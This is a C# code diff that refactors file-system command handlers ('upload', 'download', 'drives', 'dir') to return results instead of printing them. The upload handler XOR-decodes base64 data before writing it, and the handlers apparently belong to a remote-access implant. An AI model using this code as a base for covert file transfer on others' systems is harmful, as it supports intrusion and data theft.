@@ -8,15 +8,15 @@ namespace FileSystem
     {
         public string Name => "upload";
 
-        public void Execute(string[] args)
+        public string Execute(string[] args)
         {
             byte[] upstream_data = Zor(Convert.FromBase64String(args[0]), args[1]);
             string upload_path = args[2];
             File.WriteAllBytes(upload_path, upstream_data);
-            Console.WriteLine("Wrote " + upstream_data.Length.ToString() + " bytes to: " + upload_path);
+            return "Wrote " + upstream_data.Length.ToString() + " bytes to: " + upload_path;
         }
 
-        public static byte[] Zor(byte[] input, string key)
+        private static byte[] Zor(byte[] input, string key)
         {
             int _key = Int32.Parse(key);
             byte[] mixed = new byte[input.Length];
@@ -32,11 +32,11 @@ namespace FileSystem
     {
         public string Name => "download";
 
-        public void Execute(string[] args)
+        public byte[] Execute(string[] args)
         {
             string download_path = args[0];
             byte[] result = File.ReadAllBytes(download_path);
-            Console.WriteLine(Convert.ToBase64String(result));
+            return result;
         }
     }
 
@@ -44,7 +44,7 @@ namespace FileSystem
     {
         public string Name => "drives";
 
-        private static string Drives()
+        public string Execute(string[] args)
         {
             StringBuilder result = new StringBuilder();
 
@@ -67,23 +67,13 @@ namespace FileSystem
 
             return result.ToString();
         }
-
-        public void Execute(string[] args)
-        {
-            Console.WriteLine(Drives());
-        }
     }
 
     public class DirCommand
     {
         public string Name => "dir";
 
-        public void Execute(string[] args)
-        {
-            Console.WriteLine(Dir(args));
-        }
-
-        private static string Dir(string[] args)
+        public string Execute(string[] args)
         {
             StringBuilder result = new StringBuilder();
             string directory = Directory.GetCurrentDirectory();
